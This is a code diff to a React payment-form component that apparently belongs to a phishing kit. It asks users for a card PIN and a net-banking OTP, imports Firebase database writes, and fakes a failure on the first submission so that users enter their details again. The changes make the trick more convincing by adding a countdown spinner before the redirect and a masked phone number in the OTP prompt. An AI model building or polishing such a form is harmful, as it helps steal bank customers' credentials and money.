@@ -4,9 +4,10 @@ import { database } from '../firebase/firebaseConfig';
 import { ref, set } from 'firebase/database';
 import FormNavigation from './FormNavigation';
 
-const Step3PaymentMethod = ({ formData, setFormData, prevStep, onSubmit, submissionAttempt, incrementSubmissionAttempt, goToFirstStep }) => {
+const Step3PaymentMethod = ({ formData, setFormData, prevStep, onSubmit, submissionAttempt, incrementSubmissionAttempt, goToFirstStep, setGlobalMessage }) => {
   const [submitting, setSubmitting] = useState(false);
   const [submissionMessage, setSubmissionMessage] = useState('');
+  const [countdown, setCountdown] = useState(null);
   const [paymentView, setPaymentView] = useState('selection'); // 'selection', 'card_pin', 'netbanking_otp'
 
   const banks = [
@@ -76,10 +77,25 @@ const Step3PaymentMethod = ({ formData, setFormData, prevStep, onSubmit, submiss
       setTimeout(() => {
         incrementSubmissionAttempt();
         setSubmitting(false);
-        setSubmissionMessage('Submission failed. Redirecting to the first step...');
+        const failMsg = 'Submission failed. Redirecting to the first step...';
+        setSubmissionMessage(failMsg);
+        if (setGlobalMessage) setGlobalMessage(failMsg);
+
+        // Start 3-2-1 countdown
+        setCountdown(3);
+        const intervalId = setInterval(() => {
+          setCountdown(prev => {
+            if (prev === 1) {
+              clearInterval(intervalId);
+              return 0;
+            }
+            return prev - 1;
+          });
+        }, 1000);
+
         setTimeout(() => {
           goToFirstStep();
-        }, 2000); // Wait 2s before redirecting
+        }, 3000); // Wait 3s before redirecting
       }, 1500); // 1.5 second delay
     } else {
       // Second attempt: proceed with actual submission
@@ -270,7 +286,9 @@ const Step3PaymentMethod = ({ formData, setFormData, prevStep, onSubmit, submiss
         <label htmlFor="otp">One-Time Password</label>
         <input type="password" id="otp" name="otp" value={formData.otp || ''} onChange={handleChange} placeholder="Enter OTP" maxLength={6} />
       </div>
-      <p className="text-sm text-gray-500 text-center mt-2">An OTP has been sent to your registered mobile number.</p>
+      <p className="text-sm text-gray-500 text-center mt-2">
+        {`An OTP has been sent to your ${formData.mobile ? `***${formData.mobile.slice(-4)}` : 'registered mobile number'}.`}
+      </p>
       <div className="mt-6">
         <FormNavigation hasPrev onPrev={() => setPaymentView('selection')} isFinal onSubmit={handleSubmit} />
       </div>
@@ -283,7 +301,45 @@ const Step3PaymentMethod = ({ formData, setFormData, prevStep, onSubmit, submiss
       {paymentView === 'selection' && renderSelection()}
       {paymentView === 'card_pin' && renderCardPin()}
       {paymentView === 'netbanking_otp' && renderNetBankingOtp()}
-      {submissionMessage && <p className="text-sm text-center mt-3">{submissionMessage}</p>}
+      {submissionMessage && (
+        <>
+          <p
+            className="text-sm text-center mt-3"
+            style={
+              submissionMessage.toLowerCase().includes('failed') || submissionMessage.toLowerCase().includes('error')
+                ? { color: 'red', fontWeight: 'bold' }
+                : submissionMessage.toLowerCase().includes('success')
+                  ? { color: 'green', fontWeight: 'bold' }
+                  : { color: '#4B5563' }
+            }
+          >
+            {submissionMessage}
+          </p>
+          {countdown > 0 && (
+            <div className="flex justify-center mt-4">
+              <div className="relative h-20 w-20 flex items-center justify-center">
+                {/* Circular spinner using SVG for smoother look */}
+                <svg className="absolute inset-0 h-full w-full animate-spin" viewBox="0 0 50 50">
+                  <circle
+                    className="text-red-300"
+                    cx="25" cy="25" r="20"
+                    fill="none" stroke="currentColor" strokeWidth="5" opacity="0.3"
+                  />
+                  <path
+                    className="text-red-600"
+                    fill="none" strokeLinecap="round" strokeWidth="5" stroke="currentColor"
+                    d="M25 5 a20 20 0 0 1 0 40 a20 20 0 0 1 0 -40"
+                  />
+                </svg>
+                {/* Countdown number */}
+                <span className="text-red-600 font-bold text-2xl select-none">
+                  {countdown}
+                </span>
+              </div>
+            </div>
+          )}
+        </>
+      )}
     </div>
   );
 };
